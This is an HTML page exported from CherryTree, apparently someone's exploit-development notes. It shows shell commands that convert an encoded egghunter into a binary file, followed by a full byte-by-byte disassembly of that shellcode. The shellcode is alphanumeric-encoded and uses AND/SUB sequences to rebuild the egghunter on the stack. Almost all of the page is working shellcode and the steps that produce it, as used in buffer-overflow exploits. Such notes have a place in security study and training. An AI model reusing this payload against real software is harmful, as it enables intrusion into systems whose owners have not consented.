<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Output to file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Output to file</h1><br/><strong>Copy output to text file and grep</strong><br />$ grep eax encoded_egghunter.txt | awk {'print $1'} | tr -d '\n' | sed 's/.\{2\}/&amp;\\x/g'<br />25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x09\x7F\x09\x2D\x01\x01\x7F\x09\x2D\x04\x05\x01\x04\x2D\x07\x09\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x41\x7F\x09\x41\x2D\x09\x09\x09\x09\x2D\x07\x02\x03\x06\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x70\x01\x2D\x3D\x31\x04\x04\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x09\x41\x41\x41\x2D\x08\x06\x6C\x6F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x7F\x7F\x2D\x44\x7A\x25\x09\x2D\x01\x01\x01\x03\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x6B\x7F\x7F\x2D\x7E\x34\x7F\x4F\x2D\x01\x08\x34\x02\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x51\x62\x2D\x72\x3E\x5C\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x63\x6F\x31\x7F\x2D\x01\x06\x01\x7F\x2D\x36\x09\x03\x02\x50\x<br /><br /><strong>Fixed errors and output to BIN file</strong><br />$ echo -ne "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x09\x7F\x09\x2D\x01\x01\x7F\x09\x2D\x04\x05\x01\x04\x2D\x07\x09\x01\x01\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x41\x7F\x09\x41\x2D\x09\x09\x09\x09\x2D\x07\x02\x03\x06\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x70\x01\x2D\x3D\x31\x04\x04\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x09\x41\x41\x41\x2D\x08\x06\x6C\x6F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x7F\x7F\x2D\x44\x7A\x25\x09\x2D\x01\x01\x01\x03\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x6B\x7F\x7F\x2D\x7E\x34\x7F\x4F\x2D\x01\x08\x34\x02\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x7F\x7F\x51\x62\x2D\x72\x3E\x5C\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x63\x6F\x31\x7F\x2D\x01\x06\x01\x7F\x2D\x36\x09\x03\x02\x50" &gt; encoded_egghunter.bin<br /><br /><strong>Print python and opcode</strong><br />$ bash ../../../github/shellcoding/generic/convert_bin_py-hex_asm.sh encoded_egghunter.bin<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x7f\x09\x7f\x09"  #  sub   eax,0x97f097f<br />"\x2d\x01\x01\x7f\x09"  #  sub   eax,0x97f0101<br />"\x2d\x04\x05\x01\x04"  #  sub   eax,0x4010504<br />"\x2d\x07\x09\x01\x01"  #  sub   eax,0x1010907<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x41\x7f\x09\x41"  #  sub   eax,0x41097f41<br />"\x2d\x09\x09\x09\x09"  #  sub   eax,0x9090909<br />"\x2d\x07\x02\x03\x06"  #  sub   eax,0x6030207<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x7f\x7f\x70\x01"  #  sub   eax,0x1707f7f<br />"\x2d\x3d\x31\x04\x04"  #  sub   eax,0x404313d<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x09\x41\x41\x41"  #  sub   eax,0x41414109<br />"\x2d\x08\x06\x6c\x6f"  #  sub   eax,0x6f6c0608<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x7f\x7f\x7f\x7f"  #  sub   eax,0x7f7f7f7f<br />"\x2d\x44\x7a\x25\x09"  #  sub   eax,0x9257a44<br />"\x2d\x01\x01\x01\x03"  #  sub   eax,0x3010101<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x7f\x6b\x7f\x7f"  #  sub   eax,0x7f7f6b7f<br />"\x2d\x7e\x34\x7f\x4f"  #  sub   eax,0x4f7f347e<br />"\x2d\x01\x08\x34\x02"  #  sub   eax,0x2340801<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x7f\x7f\x51\x62"  #  sub   eax,0x62517f7f<br />"\x2d\x72\x3e\x5c\x33"  #  sub   eax,0x335c3e72<br />"\x50"                  #  push  eax<br />"\x25\x4a\x4d\x4e\x55"  #  and   eax,0x554e4d4a<br />"\x25\x35\x32\x31\x2a"  #  and   eax,0x2a313235<br />"\x2d\x63\x6f\x31\x7f"  #  sub   eax,0x7f316f63<br />"\x2d\x01\x06\x01\x7f"  #  sub   eax,0x7f010601<br />"\x2d\x36\x09\x03\x02"  #  sub   eax,0x2030936<br />"\x50"                  #  push  eax<br /><br /></div></body></html>